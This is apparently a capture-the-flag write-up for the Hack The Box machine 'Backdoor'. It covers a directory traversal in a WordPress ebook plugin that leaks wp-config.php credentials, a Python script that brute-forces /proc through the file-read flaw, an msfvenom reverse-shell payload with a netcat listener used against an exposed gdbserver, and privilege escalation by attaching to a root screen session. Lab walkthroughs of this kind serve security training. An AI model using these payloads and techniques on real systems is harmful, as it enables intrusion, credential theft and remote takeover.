# Backdoor

**Port scan**
```
22/open tcp ssh
80/open tcp http
1337 open tcp waste
```
## Port 80 - Wordpress

Navigating to the website redirects to `backdoor.htb`, so add it to `/etc/hosts`

`echo "10.129.96.68 backdoor.htb" | sudo tee -a /etc/hosts`

Checking for accesible directories:
- /wp-content/plugins allows directory listing

Find the ebook-download plugin and its readme where it says `Stable tag`: `1.1`
- /wp-content/plugins/ebook-download/readme.txt

### Directory transversal
Search for vulnerability exploit and found
```powershell
Foothold
Now, as we have the version info for the plugin, we could try doing a simple Google search to check for any
available exploits for this plugin version.
Sure enough, we landed on a Directory Traversal Exploit for this plugin.
# Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: Xampp on Windows7
[Version Disclosure]
======================================
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================
[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
=====================================
```
#### Testing the exploit
`http://10.129.96.68/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`

```
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' ); x
```

## Port 1337
Coming back to the port 1337, any attempt to use telnet or netcat to connect to the port are unsuccesful.

We are able to LFI to we can try to read the process information. Lets brute force the `/proc/{PID}/cmdline` file.

```python
import requests
for i in range(1, 1000):
    r = requests.get("http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"+str(i)+"/cmdline")
    out = (r.text.replace('/proc/' + str(i) + '/cmdline','').replace('<script>window.close()</script>','').replace('\00',' '))
    if len(out) > 1:
        print("PID"+str(i) + " : " + out)
```

Analyze the output of the files and find the desired 1337 port.

`853/bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done`

So... the port is a gdb server!!

### Exploit
Search the internet and find gdb version 9.2 RCE exploit.

Let's first generate our shellcode:
```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=1338 PrependFork=true -o rev.bin
```

Start a listener on port 1338
```shell
nc -nlvp 1338
```

Run the exploit:
```shell
python3 gdb_rce.py 10.129.96.68:1337 rev.bin
```

Now we have access to `user`. Normalize the shell.

## Privilege Escalation
List process with `ps -ef`. 

There is a process that is creating a `screen` process in a do-while loop.

```
PID971 : /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done 
PID973 : /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done 
```

Lets try t find the screen file:
- `find /var/run/screen/S-root -empty -exec screen -dmS root ;`

Easy, just attach to the screen.

```
screen -x root/root
```
